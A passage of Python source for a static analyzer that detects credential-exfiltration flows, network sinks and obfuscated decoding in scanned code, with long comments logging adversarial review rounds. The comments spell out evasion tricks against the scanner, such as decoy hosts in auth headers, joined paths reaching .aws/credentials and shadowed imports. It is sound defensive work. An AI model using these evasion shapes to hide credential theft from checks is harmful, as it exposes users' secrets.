            if rhs is not None and f.id not in visiting and len(visiting) < 4:
                return self.is_pathlib_ctor(rhs, visiting | {f.id})
            return False
        return (
            isinstance(f, ast.Attribute)
            and f.attr in _PATHLIB_CLASSES
            and isinstance(f.value, ast.Name)
            and f.value.id in self.pathlib_mods
        )

    def is_typed_path_join(self, call: ast.Call) -> bool:
        f = call.func
        if isinstance(f, ast.Name):
            return f.id in self.join_funcs
        return _is_path_join_call(call, self.path_aliases)

    def is_slash_sep(self, x: ast.AST, visiting: frozenset = frozenset()) -> bool:
        if isinstance(x, ast.Constant):
            return x.value == "/"
        if isinstance(x, ast.Attribute) and x.attr == "sep":
            b = x.value
            direct, viaos = self.path_aliases
            if isinstance(b, ast.Name) and (b.id in viaos or b.id in direct):
                return True
            return (
                isinstance(b, ast.Attribute)
                and b.attr == "path"
                and isinstance(b.value, ast.Name)
                and b.value.id in viaos
            )
        if isinstance(x, ast.Name) and x.id in self.single and x.id not in visiting:
            return self.is_slash_sep(self.single[x.id], visiting | {x.id})
        return False


def _fold_pjoin(acc: "str | None", part: str) -> str:
    """posixpath.join / pathlib `/` semantics: a later absolute component re-roots the
    accumulator instead of appending to it."""
    if acc is None or acc == "":
        return part
    if part.startswith("/"):
        return part
    return acc + ("" if acc.endswith("/") else "/") + part


def _fold_seg(x: ast.AST, ctx: "_FsFoldCtx", visiting: frozenset, depth: int = 0) -> "str | None":
    """A single path component's folded value: a string literal, a name resolved
    through its one binding site, or a nested path construction's own fold. `None`
    when the segment can't be determined at all (the caller substitutes _FOLD_UNK).

    B-830 round-3: *depth* bounds recursion explicitly (see _FOLD_MAX_DEPTH) instead
    of relying on a caller's try/except RecursionError. A name-hop resolution (following
    a variable back to its single assignment) counts as one more level of depth, same
    as descending into a nested path-construction expression.

    B-830 round-4: this function keeps NO memo of its own -- a Constant folds directly,
    a Name-hop recurses straight into `_fold_seg` again (never cached), and every other
    node falls through to `_fold_fs_path`, which owns `ctx.memo` and the budget-aware
    truncation guard (see its own docstring, updated round-6). So that guard belongs
    solely there; there is no second, parallel cache here to poison."""
    if depth > _FOLD_MAX_DEPTH:
        ctx.truncated += 1
        return None
    if isinstance(x, ast.Constant) and isinstance(x.value, str):
        return x.value
    if isinstance(x, ast.Name):
        if x.id in visiting or x.id not in ctx.single or len(visiting) >= 4:
            return None
        return _fold_seg(ctx.single[x.id], ctx, visiting | {x.id}, depth + 1)
    return _fold_fs_path(x, ctx, visiting, depth)


def _fold_fs_path(
    node: ast.AST, ctx: "_FsFoldCtx", visiting: frozenset = frozenset(), depth: int = 0
) -> "str | None":
    """Memoized, cycle-guarded entry point -- every subtree is folded at most once per
    (node, visiting-set) pair *at a given-or-worse depth budget* -- see round-6 below.

    B-830 round-3: a cached (already fully resolved) result is returned regardless of
    the caller's current *depth* -- it required no further recursion to produce. A
    depth-limit truncation is deliberately NEVER cached: a different, shallower call
    site reaching the same node must still get a real answer, not a poisoned "unknown"
    left behind by a deeper caller.

    B-830 round-4 (C-135 follow-up review of round-3): round-3's "never cached" claim
    above only held for THIS call's OWN `depth > _FOLD_MAX_DEPTH` check -- it did not
    hold for a node folded at depth <= _FOLD_MAX_DEPTH whose CHILDREN recurse past the
    cap. That node's own result -- built from an all-truncated (_FOLD_UNK) subtree --
    still got written to `ctx.memo` under its OWN (id(node), visiting) key. Since
    `_has_folded_cred_path` folds every subtree of the same file through ONE shared
    `ctx.memo` (via `ast.walk`, root-first), a credential-bearing node reached first as
    a DEEP descendant of an unrelated outer wrapper (~200 levels of padding) poisoned
    its own cache entry -- then the SAME node, reached later as its own shallow
    top-level walk target (where it would normally resolve cleanly), got the poisoned
    entry back instead of a fresh recompute.

    B-830 round-5 fixed that by simply deleting a truncated subtree's cache entry
    instead of writing it. Correct, but a severe quadratic performance regression (a
    fresh independent C-135 review, round-6): `ast.walk` visits EVERY node of the file
    directly, and for a long chain (a padded `.joinpath()` chain, a right-nested `/`
    chain, ...) every node along it ends up past the depth cap from *some* call site,
    so round-5 never lets any of them cache -- each direct `ast.walk` visit re-walks
    its own ~_FOLD_MAX_DEPTH-deep subtree from scratch, and does so again for every
    other node whose own re-walk passes back through it, compounding.

    B-830 round-6 (this fix): cache the result TOGETHER WITH the depth budget that was
    available when it was computed (`_FOLD_MAX_DEPTH - depth` -- how much further this
    call was allowed to recurse). A cache hit is trusted only when the NEW caller's own
    remaining budget is no BETTER than the budget the entry was computed under: a
    caller with less-or-equal budget could not have resolved any further either, so the
    cached (possibly truncated) answer is still the best available. A caller with MORE
    remaining budget than the cached entry had -- most importantly `ast.walk`'s own
    direct, depth=0 visits, which always carry the maximum possible budget -- might
    resolve further, so it recomputes instead of trusting a shallower answer. This
    reopens exactly the round-4 bug fix (a poisoned deep-descendant result can never
    survive to be handed back to that same node's own depth=0 walk target) while
    letting every node that is only ever reached at similar-or-deeper positions keep
    its cached answer -- restoring close-to-linear memoized behavior for the common
    case instead of round-5's always-recompute. A result that finished with NO
    truncation anywhere in its own subtree (`budget=None` below) is exact regardless of
    depth -- exactly round-3's original "fully resolved, cache unconditionally" case --
    and is never invalidated by a shallower caller's larger budget, which also avoids
    round-5's needless recompute of subtrees that were never actually truncated.

    B-830 round-7 (C-135 follow-up review of round-6): round-6's `budget=None` check
    above only looked at `ctx.truncated` -- whether THIS call's own subtree hit the
    depth cap directly. It missed the case where this call's subtree instead REUSED a
    cached entry from a sibling/descendant call that was itself truncated (the
    `cached_budget is not None` branch above): reusing a truncated answer makes this
    node's own result just as non-exhaustive as computing a truncation directly, but
    nothing marked it so, and it could be cached as `budget=None` ("exact at any
    depth") regardless. A later, shallower call reaching the SAME node directly then
    got that wrongly-exact cached answer back instead of a real recompute -- the same
    memoization-poisoning shape round-4 fixed, reopened through cache reuse instead of
    direct truncation. Fixed by tracking cache-reuse-of-a-truncated-entry in a second,
    separate counter (`ctx.inexact` -- deliberately not folded into `ctx.truncated`,
    which must stay an exact count of genuine depth-cap events for the disclosed
    AST_FOLD_TRUNCATED finding) and consulting BOTH counters when deciding
    cacheability: `budget=None` is only assigned when NEITHER counter moved during
    this call's own computation -- i.e. no truncation happened anywhere in this node's
    computation, INCLUDING no reuse of any depth-limited (budget is not None) cached
    entry anywhere below it, whether reached directly or transitively."""
    key = (id(node), visiting)
    entry = ctx.memo.get(key)
    if entry is not None:
        if entry is _FOLD_IN_PROGRESS:
            return None  # cycle guard: a self-referential fold resolves to unknown
        cached_res, cached_budget = entry
        if cached_budget is None:
            return cached_res  # exact: no truncation contributed, valid at any depth
        if (_FOLD_MAX_DEPTH - depth) <= cached_budget:
            # B-830 round-7: this call is REUSING a cache entry that was itself
            # computed under a truncated budget -- mark it, so this call's own
            # result (if cached by an enclosing caller) is never mistaken for
            # exact. See `ctx.inexact` and the docstring above.
            ctx.inexact += 1
            return cached_res
        # This caller's remaining budget is strictly BETTER than what produced the
        # cached entry -- it might resolve further where that computation truncated.
        # Fall through and recompute rather than trust the shallower-budget answer.
    if depth > _FOLD_MAX_DEPTH:
        ctx.truncated += 1
        return None
    ctx.memo[key] = _FOLD_IN_PROGRESS  # cycle guard
    before = ctx.truncated + ctx.inexact
    res = _fold_fs_path_uncached(node, ctx, visiting, depth)
    budget = None if (ctx.truncated + ctx.inexact) == before else (_FOLD_MAX_DEPTH - depth)
    ctx.memo[key] = (res, budget)
    return res


def _fold_fs_path_uncached(
    node: ast.AST, ctx: "_FsFoldCtx", visiting: frozenset, depth: int = 0
) -> "str | None":
    def seg_or_unk(x: ast.AST) -> str:
        if isinstance(x, ast.Starred):
            return _FOLD_UNK
        s = _fold_seg(x, ctx, visiting, depth + 1)
        return _FOLD_UNK if s is None else s

    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
        # pathlib's `/` operator. Fold it only when at least one side is provably
        # path-shaped -- otherwise this is ordinary arithmetic, not a path join.
        right = _fold_seg(node.right, ctx, visiting, depth + 1)
        left = _fold_seg(node.left, ctx, visiting, depth + 1)
        left_is_path = left is not None and not isinstance(node.left, ast.Constant)
        if right is None and not left_is_path:
            return None
        return _fold_pjoin(_FOLD_UNK if left is None else left, _FOLD_UNK if right is None else right)

    if not isinstance(node, ast.Call):
        return None
    f = node.func
    args = []
    for a in node.args:  # splice a literal *[...] so join(*[a, b]) reads like join(a, b)
        if isinstance(a, ast.Starred) and isinstance(a.value, (ast.List, ast.Tuple)):
            args.extend(a.value.elts)
        else:
            args.append(a)

    # Suffix-preserving wrappers change at most a leading '~' or the outer type, never
    # the literal tail -- the tail read straight through them is exact.
    if ctx.is_suffix_preserving(node) and len(args) == 1 and not node.keywords:
        return _fold_seg(args[0], ctx, visiting, depth + 1)
    if (
        isinstance(f, ast.Attribute)
        and f.attr in ("expanduser", "absolute", "resolve")
        and not args
        and not node.keywords
    ):
        inner = _fold_fs_path(f.value, ctx, visiting, depth + 1)
        if inner is not None:
            return inner
    if isinstance(f, ast.Attribute) and f.attr == "joinpath":
        # Gate S: `.joinpath(...)` counts on ANY receiver -- the method name alone is
        # the signal; an unresolved receiver just folds to _FOLD_UNK.
        acc = seg_or_unk(f.value)
        for a in args:
            acc = _fold_pjoin(acc, seg_or_unk(a))
        return acc
    if ctx.is_pathlib_ctor(f) and args:
        acc = None
        for a in args:
            acc = _fold_pjoin(acc, seg_or_unk(a))
        return acc
    if args and ctx.is_typed_path_join(node):
        acc = None
        for a in args:
            acc = _fold_pjoin(acc, seg_or_unk(a))
        return acc
    if isinstance(f, ast.Name) and f.id == "join" and len(args) >= 2 and not node.keywords:
        # Tier B: an unverified bare `join(...)` name called with 2+ positional args --
        # str.join is unary, so this cannot be a string join. Root forced opaque since
        # the join semantics (and thus re-rooting) aren't proven.
        return _FOLD_UNK + "".join("/" + seg_or_unk(a) for a in args)
    if isinstance(f, ast.Attribute) and f.attr == "join":
        recv = f.value
        if len(args) == 1 and isinstance(args[0], (ast.List, ast.Tuple)) and ctx.is_slash_sep(recv):
            return "/".join(seg_or_unk(e) for e in args[0].elts)
        if (
            len(args) >= 2
            and not node.keywords
            and not (isinstance(recv, ast.Constant) and isinstance(recv.value, (str, bytes)))
        ):
            # Tier B, attribute form (`x.join(a, b, ...)`) -- same reasoning as above.
            return _FOLD_UNK + "".join("/" + seg_or_unk(a) for a in args)
    return None


def _has_folded_cred_path(node: ast.AST, ctx: "_FsFoldCtx") -> bool:
    """True if any subtree of *node* folds to a value containing one of the closed
    Gate-V credential-filename patterns (see the module comment above)."""
    for n in ast.walk(node):
        fs = _fold_fs_path(n, ctx)
        if fs and _FOLDED_CRED_PATH_RE.search(fs):
            return True
    return False


def _has_cred_path_const(node: ast.AST, ctx: "_FsFoldCtx | None" = None) -> bool:
    """True if the subtree contains a string constant naming a credential file, OR --
    when *ctx* is given -- a root-independent credential path assembled via typed
    path-join construction (B-830; see the Gate V/S/A block above)."""
    for n in ast.walk(node):
        if (
            isinstance(n, ast.Constant)
            and isinstance(n.value, str)
            and _CRED_PATH_RE.search(n.value)
        ):
            return True
    return ctx is not None and _has_folded_cred_path(node, ctx)


# B-422 follow-up (C-348 adversarial re-review): base-gating put/patch/request on the
# LITERAL _NET_SINK_BASES names (see the block above) silently kills detection for the
# overwhelmingly common case of a session/client bound to a non-literal variable name --
# `s = requests.Session(); s.put(...)`, `client = httpx.Client(); client.request(...)`,
# `conn = socket.socket(...); conn.connect(...)` -- since _attr_base has no alias/data-flow
# resolution and none of "s"/"client"/"conn"/"sess" are in _NET_SINK_BASES. That reopened
# the exact false-negative the original literal-base check already had (it only ever
# recognized the single spelling "session"), and now spans all five rules _is_net_sink
# feeds (CRED_EXFIL_FLOW/ENV_EXFIL_FLOW/HOST_INFO_EXFIL_FLOW/CONDITIONAL_SINK/env-auth-kwarg).
# Fix: resolve a small, explicit alias set per file -- names assigned from a networking-
# library constructor call (`<base in _NET_SINK_BASES>.<CapitalizedCtor>(...)` or
# `socket.socket(...)`), plus a short alias-of-alias fixpoint (`s2 = s`) -- and let
# _is_net_sink treat those names the same as a literal base. Deliberately narrow: only a
# constructor-shaped call (attr starts uppercase, or the literal "socket" module-level
# factory) seeds an alias, so an unrelated `x = requests.get(url)` response object does
# NOT retroactively make `x.put(...)` a sink for something that isn't request-shaped.
_NET_SINK_CTOR_BASES = frozenset({"socket"})  # base.attr() ctor pairs beyond CapitalCase
# Full dotted-path spellings (via _dotted_path) recognized as networking constructor
# MODULES, on top of the single-segment _NET_SINK_BASES lookup. Needed for a submodule
# whose _attr_base last-segment alone isn't trustworthy as a bare base -- e.g.
# `http.client.HTTPSConnection(...)`'s base is the Attribute chain `http.client`, whose
# last segment is "client" (not a name worth matching on its own), but the full path
# "http.client" unambiguously names the stdlib networking module. http.client is a
# common dependency-free exfil vector (no `requests`/`httpx` import to catch on),
# confirmed missed by the C-348 re-review of B-422.
_NET_SINK_CTOR_MODULE_PATHS = frozenset({"http.client"})


def _net_sink_alias_names(tree: ast.AST) -> frozenset[str]:
    """Names (lowercased, to match _attr_base) transitively assigned from a known
    networking-library session/client/socket constructor -- so `s = requests.Session()`
    or `conn = http.client.HTTPSConnection(...)` followed by `s.put(...)` /
    `conn.request(...)` is still recognized as a network sink even though neither
    variable is literally named "session". Small fixpoint for simple alias-of-alias
    chains (`s2 = s`), mirroring _cred_tainted_names' shape."""
    aliases: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    for _ in range(4):
        changed = False
        for a in assigns:
            rhs = a.value
            is_known_ctor_module = isinstance(rhs, ast.Call) and isinstance(
                rhs.func, ast.Attribute
            ) and (
                _attr_base(rhs.func.value) in _NET_SINK_BASES
                or _dotted_path(rhs.func.value) in _NET_SINK_CTOR_MODULE_PATHS
            )
            is_ctor_call = is_known_ctor_module and (
                rhs.func.attr[:1].isupper() or rhs.func.attr in _NET_SINK_CTOR_BASES
            )
            is_alias_chain = isinstance(rhs, ast.Name) and rhs.id.lower() in aliases
            if is_ctor_call or is_alias_chain:
                for t in a.targets:
                    if isinstance(t, ast.Name) and t.id.lower() not in aliases:
                        aliases.add(t.id.lower())
                        changed = True
        if not changed:
            break
    return frozenset(aliases)


def _is_net_sink(func: ast.AST, net_sink_aliases: frozenset[str] = frozenset()) -> bool:
    if isinstance(func, ast.Name):
        return func.id == "urlopen"
    if isinstance(func, ast.Attribute):
        if func.attr in _NET_SINK_ATTRS_ANY:
            return True
        if func.attr in _NET_SINK_ATTRS_BASED:
            base = _attr_base(func.value)
            return base in _NET_SINK_BASES or base in net_sink_aliases
    return False


def _cred_tainted_names(tree: ast.AST, ctx: "_FsFoldCtx | None" = None) -> set[str]:
    """Names whose value derives from reading a credential file (transitively)."""
    tainted: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    for _ in range(4):  # small fixpoint for multi-step flows (p = path; k = open(p).read())
        changed = False
        for a in assigns:
            if _has_cred_path_const(a.value, ctx) or (_names_in(a.value) & tainted):
                for t in a.targets:
                    if isinstance(t, ast.Name) and t.id not in tainted:
                        tainted.add(t.id)
                        changed = True
        if not changed:
            break
    return tainted


def _has_incluster_token_path_const(node: ast.AST) -> bool:
    """True if the subtree contains a string constant naming the K8s in-cluster
    service-account token mount specifically (not any other credential path)."""
    for n in ast.walk(node):
        if (
            isinstance(n, ast.Constant)
            and isinstance(n.value, str)
            and _INCLUSTER_TOKEN_PATH_RE.search(n.value)
        ):
            return True
    return False


def _cred_source_classification(node: ast.AST, ctx: "_FsFoldCtx | None" = None) -> str:
    """Classifies *node*'s own credential-path string constants (not recursing
    through names -- callers combine this with the running pure/impure sets for
    that): 'other' if it contains ANY credential-path literal that is NOT the
    narrow in-cluster token path -- even when an in-cluster literal ALSO appears,
    since mixing the two in one expression (e.g. a ternary) makes the value
    impure; 'incluster' if it contains ONLY in-cluster token literal(s); 'none'
    if it contains no credential-path literal at all.

    B-830 round-2 (C-135): *ctx*, when given, also asks whether *node* folds (Gate
    V/S/A) to a real closed-set credential filename -- catching a path built FROM
    the in-cluster token literal but extended with additional joined segments (e.g.
    `Path(INCLUSTER_TOKEN).joinpath('..', '..', '.aws', 'credentials')`), which the
    per-literal scan alone can't see since no single string constant spells out the
    assembled ".aws/credentials" tail. Such a fold always forces 'other', even when
    an in-cluster literal is ALSO present -- the same mixing-makes-it-impure
    reasoning as the literal-only case above."""
    has_incluster = False
    has_other = False
    for n in ast.walk(node):
        if isinstance(n, ast.Constant) and isinstance(n.value, str):
            if _INCLUSTER_TOKEN_PATH_RE.search(n.value):
                has_incluster = True
            elif _CRED_PATH_RE.search(n.value):
                has_other = True
    if not has_other and ctx is not None and _has_folded_cred_path(node, ctx):
        has_other = True
    if has_other:
        return "other"
    if has_incluster:
        return "incluster"
    return "none"


def _incluster_pure_tainted_names(tree: ast.AST, ctx: "_FsFoldCtx | None" = None) -> set[str]:
    """Subset of credential-tainted names whose value derives ONLY from the
    narrow in-cluster service-account-token path -- never mixed with, or
    overwritten by, a read from any OTHER credential-path source (.ssh, .aws, a
    generic secrets mount, etc.) on ANY reaching assignment. This is the
    source-side half of the CRED_EXFIL_FLOW in-cluster-auth exemption (see its
    call site below): a name tainted via BOTH an in-cluster read and a generic
    credential read -- e.g. one branch of an if/else reads the K8s token, the
    other reads ~/.ssh/id_rsa, into the SAME variable -- is deliberately
    excluded here, so a mixed flow can never qualify for the exemption. C-135:
    this closes the specific smuggling attempt of dressing a real stolen
    credential as if it shared a name with the legitimate in-cluster token.

    *ctx*, when given, is threaded into `_cred_source_classification` so a folded
    (path-join-assembled) credential extension of the in-cluster literal is caught
    too -- see that function's docstring (B-830 round-2)."""
    pure: set[str] = set()
    impure: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    for _ in range(4):  # small fixpoint, mirrors _cred_tainted_names
        changed = False
        for a in assigns:
            targets = [t.id for t in a.targets if isinstance(t, ast.Name)]
            if not targets:
                continue
            classification = _cred_source_classification(a.value, ctx)
            refs_impure = bool(_names_in(a.value) & impure)
            refs_pure = bool(_names_in(a.value) & pure)
            for name in targets:
                if classification == "other" or refs_impure:
                    if name not in impure:
                        impure.add(name)
                        pure.discard(name)
                        changed = True
                elif classification == "incluster" or refs_pure:
                    if name not in impure and name not in pure:
                        pure.add(name)
                        changed = True
        if not changed:
            break
    return pure - impure


def _simple_str_const_assigns(tree: ast.AST) -> dict:
    """Best-effort `name -> literal` map for simple single-target
    `name = "..."` string assignments -- used only to resolve a destination-host
    VARIABLE (e.g. `api_server = "https://kubernetes.default.svc"`) for the
    CRED_EXFIL_FLOW in-cluster-auth exemption's destination check below; not a
    general dataflow model. An unresolvable name is simply absent from the map,
    which the destination check below treats as "not confirmed" (fails closed)."""
    out: dict = {}
    for n in ast.walk(tree):
        if (
            isinstance(n, ast.Assign)
            and len(n.targets) == 1
            and isinstance(n.targets[0], ast.Name)
            and isinstance(n.value, ast.Constant)
            and isinstance(n.value.value, str)
        ):
            out[n.targets[0].id] = n.value.value
    return out


def _resolves_to_incluster_host(subtrees: list, str_map: dict) -> bool:
    """True if any of *subtrees* contains (directly, or via a name resolved
    through *str_map*) a literal matching the cluster's own in-cluster API
    server signal. Fails closed: anything it can't positively resolve is simply
    not a match."""
    for subtree in subtrees:
        for n in ast.walk(subtree):
            if isinstance(n, ast.Constant) and isinstance(n.value, str):
                if _INCLUSTER_API_HOST_RE.search(n.value):
                    return True
            elif isinstance(n, ast.Name) and n.id in str_map:
                if _INCLUSTER_API_HOST_RE.search(str_map[n.id]):
                    return True
    return False


def _is_incluster_auth_exempt(node: ast.Call, hit_names: set, str_map: dict) -> bool:
    """B-415/C-135: True only when EVERY tainted name in *hit_names* (already
    confirmed by the caller to derive PURELY from the in-cluster service-account
    token, via `_incluster_pure_tainted_names`) appears ONLY in an auth-position
    kwarg (headers=/auth=/cert=, mirroring ENV_EXFIL_FLOW's own _ENV_AUTH_KWARGS
    exemption) -- never the URL, body, params, or a positional arg -- AND the
    call's own non-auth-position arguments resolve to the cluster's own API
    server. Both conditions are read from the SAME non-auth-position subtrees on
    purpose: a decoy destination string planted inside headers=/auth=/cert=
    itself must never count as confirming the destination, or a real exfil call
    could launder its true destination through the very kwarg this exemption
    trusts (e.g. `headers={"Authorization": tok, "X-Decoy": "kubernetes.default.svc"}`
    aimed at an attacker host in the URL)."""
    non_auth_subtrees = [
        *node.args,
        *(kw.value for kw in node.keywords if kw.arg not in _ENV_AUTH_KWARGS),
    ]
    auth_subtrees = [kw.value for kw in node.keywords if kw.arg in _ENV_AUTH_KWARGS]
    if any(hit_names & _names_in(s) for s in non_auth_subtrees):
        return False  # a tainted name also reaches a non-auth position -- real exfil shape
    if not any(hit_names & _names_in(s) for s in auth_subtrees):
        return False  # tainted name isn't actually in an auth position at all
    return _resolves_to_incluster_host(non_auth_subtrees, str_map)


def _is_decode_call(node: ast.AST) -> bool:
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if isinstance(f, ast.Name) and f.id in _DECODE_FUNCS:
        return True
    return isinstance(f, ast.Attribute) and f.attr in _DECODE_ATTRS


def _rebound_names(tree: ast.AST) -> "tuple[set, set]":
    """`(names, os_attr)` -- every binding form other than a qualifying import that can
    take a name (or, for `os_attr`, an attribute) away from `_path_module_aliases`.

    B-855. `_path_module_aliases`'s own rebind check used to look only at Assign/
    AugAssign/AnnAssign targets that were themselves a bare `ast.Name`. That missed
    every other way Python binds a name: a for-loop target, a comprehension variable, a
    walrus (`:=`), a `with ... as` target, a `def`/`class` name, an `except ... as`
    name, tuple/list/starred unpacking (`path, k = "", 1`), and a second import binding
    the same name to something else (`import evil as path` after `from os import
    path` -- Python's last binding wins, same as a plain reassignment). Left uncaught,
    each one let a shadowed name keep path-module standing, which
    `_decode_signal_is_only_artifact_relative_reads` then trusted enough to skip --
    exactly the receiver gap the pairing attack in that function's docstring depends on.

    `os_attr` covers a DIFFERENT shape: `os.path = <obj>` does not rebind the name
    `os` at all, it mutates the `.path` attribute the `viaos` reading (`X.path.join`)
    depends on. Any assignment target `X.path = ...` where `X` is a plain name drops
    that `X` from `viaos`, regardless of whether `X` is `os` or an alias of it.

    Both sets only ever REMOVE trust (the fail-safe direction from the original
    docstring) -- membership here can put a call back under suspicion, never exempt one.
    Import bindings that DO match a recognized path-import pattern are handled by the
    caller, not here, so a legitimate `from os import path` never appears in `names`.
    """

    def _targets(t: ast.AST):
        if isinstance(t, ast.Name):
            yield t.id
        elif isinstance(t, (ast.Tuple, ast.List)):
            for e in t.elts:
                yield from _targets(e)
        elif isinstance(t, ast.Starred):
            yield from _targets(t.value)

    names: set = set()
    os_attr: set = set()
    for n in ast.walk(tree):
        if isinstance(n, (ast.Assign, ast.AugAssign, ast.AnnAssign)):
            for t in (n.targets if isinstance(n, ast.Assign) else [n.target]):
                names.update(_targets(t))
                if (
                    isinstance(t, ast.Attribute)
                    and t.attr == "path"
                    and isinstance(t.value, ast.Name)
                ):
                    os_attr.add(t.value.id)
        elif isinstance(n, (ast.For, ast.AsyncFor)):
            names.update(_targets(n.target))
        elif isinstance(n, ast.comprehension):
            names.update(_targets(n.target))
        elif isinstance(n, ast.NamedExpr):
            names.update(_targets(n.target))
        elif isinstance(n, (ast.With, ast.AsyncWith)):
            for item in n.items:
                if item.optional_vars is not None:
                    names.update(_targets(item.optional_vars))
        elif isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            names.add(n.name)
        elif isinstance(n, ast.ExceptHandler) and n.name:
            names.add(n.name)
    return names, os_attr


def _path_module_aliases(tree: ast.AST) -> tuple:
    """`(direct, viaos)` — the names *tree*'s own imports bind to a path module.

    B-753. `direct` holds names whose `.join(...)` is a path join (`from os import path`,
    `import posixpath`, `import os.path as p`, each with or without `as`). `viaos` holds
    names X where the join is reached as `X.path.join(...)` (`import os`, `import os as
    o`, `import os.path` without an alias).

    NOTHING IS SEEDED. The first version pre-loaded `{"posixpath", "ntpath"}` before
    looking at a single import, which made a bare local variable with either name a path
    module -- the cheapest of the false cleans an adversarial pass found here. A name only
    earns membership by being bound, in this file, by an import statement.

    B-855: a name earning membership via import is not enough either -- see
    `_rebound_names` for every other way that same name can be taken back.
    """
    direct: set = set()   # names whose `.join(...)` is a path join
    viaos: set = set()    # names X where `X.path.join(...)` is a path join
    bad_imports: set = set()  # names an UNRELATED import binds -- last binding wins
    for n in ast.walk(tree):
        if isinstance(n, ast.Import):
            for a in n.names:
                if a.name in ("posixpath", "ntpath"):
                    direct.add(a.asname or a.name)
                elif a.name == "os.path":
                    # `import os.path as p` binds p to the module; without asname it
                    # binds `os`, and the join is then reached as `os.path.join`.
                    (direct if a.asname else viaos).add(a.asname or "os")
                elif a.name == "os":
                    viaos.add(a.asname or "os")
                else:
                    # e.g. `import evil as path` -- binds `path` to something that is
                    # not a path module at all.
                    bad_imports.add(a.asname or a.name.split(".")[0])
        elif isinstance(n, ast.ImportFrom):
            if n.module == "os":
                for a in n.names:
                    if a.name == "path":
                        direct.add(a.asname or "path")
                    elif a.name != "*":
                        bad_imports.add(a.asname or a.name)
            else:
                for a in n.names:
                    if a.name != "*":
                        # e.g. `from evil import x as path` -- same shadowing shape,
                        # different module.
                        bad_imports.add(a.asname or a.name)

    # A name that is ALSO bound some other way anywhere in the module is not trusted:
    # `from os import path` followed by `path = ""`, a for-loop `for path in ...`, a
    # walrus, `def path`, `except ... as path`, tuple/list unpacking, a comprehension
    # variable, or a second, unrelated import all leave the join reaching something
    # that is not the module the import line promised. The verdict has to follow the
    # value rather than the import line, and dropping the name is the fail-safe
    # direction -- it can only put a call back under suspicion. `os.path = <obj>` is a
    # different shape again (an attribute mutation, not a name rebind) and is dropped
    # from `viaos` only.
    other_rebound, os_attr_rebound = _rebound_names(tree)
    rebound = other_rebound | bad_imports
    return direct - rebound, viaos - (rebound | os_attr_rebound)


def _is_path_join_call(node: ast.AST, path_aliases: "set | None" = None) -> bool:
    """True when *node* is `os.path.join(...)` — a PATH join, not a string join.

    B-753. `join` is in `_DECODE_ATTRS` because `"".join(parts)` is a real
    content-hiding primitive: assembling a payload from fragments is one of the shapes
    this analyzer hunts. But the membership is by ATTRIBUTE NAME, so an ordinary
    `os.path.join(...)` matches it too, and that misclassification is not harmless --
    it made the artifact-relative carve-out bail before it ever reached the genuine
    `.decode()` in the same expression, convicting the canonical `setup.py` idiom
    written as a one-liner.

    The discrimination is on the RECEIVER, and every leg of it is an IMPORT BINDING, not
    a name. That is the second version. The first accepted any attribute chain ending in
    `.path` and seeded the alias set with `posixpath`/`ntpath` unconditionally, and an
    adversarial pass killed it: `self.path.join(payload)`, `cfg.path.join(payload)`,
    `Outer().b.path.join(payload)`, and a bare local variable literally named `posixpath`
    all qualified. The refutation that matters is not any single shape but why they
    worked -- see the pairing note in the caller. Seeding names was exactly the
    name-guessing this docstring already claimed to avoid, one line below where it
    claimed it.

    So: a bare `X.join(...)` qualifies only when `X` is bound by an import to a path
    module, and `X.path.join(...)` only when `X` is bound by an import to `os`. A name
    that is reassigned anywhere in the module is dropped from both sets, because
    `from os import path` followed by `path = ""` leaves the join reaching a string.
    A string constant, an unbound variable, an instance attribute, a subscript, or
    anything unresolvable keeps its old meaning and still counts as the obfuscation
    primitive.
    """
    if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)):
        return False
    if node.func.attr != "join":
        return False
    direct, viaos = path_aliases or (set(), set())
    base = node.func.value
    if isinstance(base, ast.Name):
        return base.id in direct
    if isinstance(base, ast.Attribute) and base.attr == "path":
        return isinstance(base.value, ast.Name) and base.value.id in viaos
    return False


def _has_xor_decode(node: ast.AST) -> bool:
    """F-053: True when the subtree builds a byte/char sequence via XOR — bytes(...^...),
    bytearray(...^...), or a comprehension containing ^ — the common non-base64
    obfuscation. A scalar `a ^ b` (bit flags) is NOT flagged: the XOR must sit inside a
    sequence-builder or comprehension, which is the decode shape."""
    for n in ast.walk(node):
        if (
            isinstance(n, ast.Call)
            and isinstance(n.func, ast.Name)
            and n.func.id in ("bytes", "bytearray")
        ):
            if any(isinstance(s, ast.BinOp) and isinstance(s.op, ast.BitXor) for s in ast.walk(n)):
                return True
        if isinstance(n, (ast.ListComp, ast.GeneratorExp, ast.SetComp)):
            if any(isinstance(s, ast.BinOp) and isinstance(s.op, ast.BitXor) for s in ast.walk(n)):
                return True
    return False


def _subtree_has_decode(node: ast.AST) -> bool:
    return any(_is_decode_call(n) for n in ast.walk(node)) or _has_xor_decode(node)


def _is_decode_primitive_call(node: ast.AST) -> bool:
    """A real decode/decompress primitive call (the base64/zlib/hex family in
    _DECODE_FUNCS) -- excludes the generic 'decode'/'fromhex'/'join' attribute names
    that `_is_decode_call` also matches for the tighter single-expression check. Those
    bare names are too common on ordinary code (`os.path.join`, `str.join`,
    `thread.join`, `bytes.decode('utf-8')`) to safely use as the signal that names a
    WHOLE function as decode-composing (see C-135 finding on C-202: this exact
    collision false-FAILed a benign template-engine skill at crit severity)."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if isinstance(f, ast.Name) and f.id in _DECODE_FUNCS:
        return True
    return isinstance(f, ast.Attribute) and f.attr in _DECODE_FUNCS


def _assign_target_names(target: ast.AST) -> set[str]:
    """Bare names bound by an assignment target, unpacking tuples/lists/starred
    targets (`a, *b = ...` -> {'a', 'b'})."""
    if isinstance(target, ast.Name):
        return {target.id}
    if isinstance(target, (ast.Tuple, ast.List)):
        names: set[str] = set()
        for elt in target.elts:
            names |= _assign_target_names(elt)
        return names
    if isinstance(target, ast.Starred):
        return _assign_target_names(target.value)
    return set()


# `match`-statement capture patterns bind names too, but their AST node types only
# exist on Python 3.10+. Resolved once at import time so this module still imports on
# the 3.9 floor, where `match` cannot be parsed at all and these stay empty/None.
_MATCH_BIND_NODES = tuple(
